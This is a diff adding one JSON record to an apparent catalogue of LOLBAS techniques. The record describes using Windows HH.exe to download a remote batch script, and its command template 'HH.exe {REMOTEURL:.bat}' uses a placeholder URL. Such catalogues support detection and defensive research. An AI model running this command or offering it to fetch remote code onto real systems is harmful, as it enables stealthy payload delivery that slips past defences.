@@ -1,0 +1,23 @@
+{
+  "id": "lolbas-hh-exe-download",
+  "name": "LOLBAS · Hh.exe (Download)",
+  "command": "HH.exe {REMOTEURL:.bat}",
+  "description": "Open the target batch script with HTML Help.",
+  "platform": "windows",
+  "tags": [
+    "lolbas",
+    "hh",
+    "download"
+  ],
+  "source": "lolbas",
+  "source_url": "https://lolbas-project.github.io/lolbas/Hh/",
+  "upstream_id": "Hh.exe/Download/0",
+  "category": "lolbas",
+  "subcategory": "download",
+  "references": [
+    {
+      "title": "LOLBAS — Hh.exe",
+      "url": "https://lolbas-project.github.io/lolbas/Hh/"
+    }
+  ]
+}
